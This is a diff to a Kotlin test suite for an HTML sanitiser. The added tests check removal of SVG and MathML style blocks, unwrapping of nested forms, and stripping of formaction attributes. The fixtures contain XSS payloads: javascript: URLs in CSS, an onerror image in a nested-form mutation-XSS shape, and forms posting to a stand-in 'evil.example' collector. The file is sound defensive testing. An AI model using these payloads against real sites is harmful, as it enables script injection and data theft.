@@ -1,5 +1,6 @@
 package dev.vibemotion.api.clone
 
+import dev.vibemotion.api.clone.HtmlSanitiser.Companion.rewriteStyleText
 import io.kotest.assertions.throwables.shouldThrow
 import io.kotest.assertions.withClue
 import io.kotest.core.spec.style.FunSpec
@@ -8,6 +9,7 @@ import io.kotest.matchers.shouldBe
 import io.kotest.matchers.string.shouldContain
 import io.kotest.matchers.string.shouldNotContain
 import org.jsoup.Jsoup
+import org.jsoup.nodes.Comment
 import org.jsoup.nodes.Document
 import java.nio.charset.StandardCharsets
 import java.nio.file.Files
@@ -149,7 +151,8 @@ class HtmlSanitiserTest :
             listOf("plain", "mixed", "escaped", "vb", "datahtml").forEach { id ->
                 withClue(id) { document.selectFirst("#$id").shouldNotBeNull().attr("href") shouldBe "#" }
             }
-            document.selectFirst("#fa").shouldNotBeNull().attr("formaction") shouldBe "#"
+            // `formaction` is removed outright rather than defused; see the dedicated test below.
+            document.selectFirst("#fa").shouldNotBeNull().hasAttr("formaction") shouldBe false
             document.selectFirst("#use").shouldNotBeNull().attr("xlink:href") shouldBe "#"
         }
 
@@ -168,23 +171,133 @@ class HtmlSanitiserTest :
             document.selectFirst("style").shouldNotBeNull().data() shouldContain """url("#")"""
         }
 
-        test("defuses a style block inside svg without deleting the rest of the sheet") {
-            // Foreign content: an svg `<style>` holds a text node, so `data()` is empty and the
-            // old unconditional write-back emptied the element.
+        test("a style block inside svg is removed outright, not defused") {
+            // Whether a `<style>` in foreign content holds text or markup depends on the exact
+            // insertion mode, and a browser and jsoup can disagree. Removing it is the only answer
+            // that does not require re-implementing a parser. The cost — an inline icon's own CSS
+            // — is accepted and recorded in docs/architecture.md.
             val document =
                 sanitised(
-                    """<html><body><svg><style>a{background:url(javascript:alert(1))} circle{fill:red}</style></svg></body></html>""",
+                    """<html><body><svg><style>a{background:url(javascript:alert(1))} circle{fill:red}</style><circle/></svg></body></html>""",
                 )
-            val css = document.selectFirst("svg style").shouldNotBeNull().wholeText()
 
-            css shouldContain """url("#")"""
-            css shouldContain "circle{fill:red}"
+            document.select("svg style").size shouldBe 0
+            document.outerHtml() shouldNotContain "javascript:"
+            // Only the `<style>` goes; the drawing survives.
+            document.selectFirst("svg").shouldNotBeNull()
+            document.selectFirst("circle").shouldNotBeNull()
         }
 
         test("a style block with nothing to defuse is not rewritten at all") {
             val document = sanitised("<html><head><style>a > b { color: red }</style></head><body></body></html>")
 
             document.selectFirst("style").shouldNotBeNull().data() shouldBe "a > b { color: red }"
+        }
+
+        test("unwraps a nested form, because a browser ignores the inner start tag and jsoup does not") {
+            // The differential this exists for: jsoup keeps the inner `<form>` and serialises it,
+            // a browser drops the start tag, and everything after it lands one level higher.
+            val document =
+                sanitised("""<html><body><form id="outer"><p>a</p><form id="inner"><input name="q"></form></form></body></html>""")
+
+            document.select("form").map { it.id() } shouldBe listOf("outer")
+            // Unwrapped, not removed: the content it held is still there.
+            document.selectFirst("input").shouldNotBeNull().attr("name") shouldBe "q"
+            document.selectFirst("p").shouldNotBeNull().text() shouldBe "a"
+        }
+
+        test("unwraps forms nested three deep") {
+            val document = sanitised("<html><body><form><form><form><input></form></form></form></body></html>")
+
+            document.select("form").size shouldBe 1
+            document.select("input").size shouldBe 1
+        }
+
+        test("removes every raw-text element from inside svg and math, integration points included") {
+            val document =
+                sanitised(
+                    """
+                    <html><body>
+                      <svg><style>a{fill:red}</style><desc><style>b{fill:red}</style></desc>
+                        <foreignObject><style>c{fill:red}</style><noembed>x</noembed></foreignObject></svg>
+                      <math><mtext><mglyph><style>d{color:red}</style></mglyph><xmp>y</xmp></mtext></math>
+                      <style>e{color:red}</style>
+                    </body></html>
+                    """.trimIndent(),
+                )
+
+            document.select("svg style, math style, svg noembed, math xmp").size shouldBe 0
+            // An ordinary HTML `<style>` outside foreign content is untouched.
+            document.selectFirst("body > style").shouldNotBeNull().data() shouldBe "e{color:red}"
+            // The foreign elements themselves survive; only the ambiguous children go.
+            document.select("svg").size shouldBe 1
+            document.selectFirst("desc").shouldNotBeNull()
+        }
+
+        test("removes a form from foreign content, but keeps one inside an HTML integration point") {
+            val document =
+                sanitised(
+                    """
+                    <html><body>
+                      <svg><g><form id="inSvg"><input name="a"></form></g>
+                        <foreignObject><form id="inForeignObject" action="https://evil.example/c"><input name="b"></form></foreignObject></svg>
+                      <math><mtext><form id="inMath"><input name="c"></form></mtext></math>
+                    </body></html>
+                    """.trimIndent(),
+                )
+
+            document.select("#inSvg").size shouldBe 0
+            // `foreignObject` resumes ordinary HTML parsing, so the form is disarmed like any other.
+            document.selectFirst("#inForeignObject").shouldNotBeNull().attr("action") shouldBe "#"
+            // `mtext` is an integration point too, so the form survives, disarmed.
+            document.selectFirst("#inMath").shouldNotBeNull().attr("action") shouldBe "#"
+        }
+
+        test("the nested-form-plus-MathML-style shape leaves nothing a browser could run") {
+            // The document that proved jsoup is not an oracle: the `<style>` lands in MathML, where
+            // it is not a raw-text element, and its contents become live elements in a browser.
+            val document =
+                sanitised(
+                    """<html><body><form><math><mtext></form><form><mglyph><style></math><img src onerror="x()"></body></html>""",
+                )
+
+            document.select("style").size shouldBe 0
+            document.outerHtml() shouldNotContain "onerror"
+        }
+
+        test("a style element whose CSS is split across several text nodes is rewritten whole") {
+            // After `stripComments`, a foreign `<style>` that held a comment has two adjacent text
+            // nodes; rewriting only a single child silently skipped it and left the CSS untouched.
+            val document = Jsoup.parse("<svg><style>a{color:red}<!--x-->b{color:blue}</style></svg>")
+            val style = document.selectFirst("style").shouldNotBeNull()
+            style.childNodes().filterIsInstance<Comment>().forEach { it.remove() }
+            style.childNodeSize() shouldBe 2
+
+            style.rewriteStyleText { css -> css.replace("color", "COLOR") }
+
+            style.wholeText() shouldBe "a{COLOR:red}b{COLOR:blue}"
+        }
+
+        test("removes formaction and its companions wherever the form action is neutralised") {
+            // `formaction` on a submit button overrides `action`, so neutralising the form alone
+            // still let an exported page post to a third party.
+            val document =
+                sanitised(
+                    """
+                    <html><body><form action="https://evil.example/c" target="_top">
+                      <button id="b" formaction="https://evil.example/collect" formmethod="post" formtarget="_blank" formenctype="text/plain">go</button>
+                      <input id="i" type="submit" formaction="javascript:x()">
+                    </form></body></html>
+                    """.trimIndent(),
+                )
+            val button = document.selectFirst("#b").shouldNotBeNull()
+
+            document.selectFirst("form").shouldNotBeNull().attr("action") shouldBe "#"
+            listOf("formaction", "formmethod", "formtarget", "formenctype").forEach { attribute ->
+                withClue(attribute) { button.hasAttr(attribute) shouldBe false }
+            }
+            document.selectFirst("#i").shouldNotBeNull().hasAttr("formaction") shouldBe false
+            document.outerHtml() shouldNotContain "evil.example/collect"
         }
 
         test("keeps forms but disarms them") {
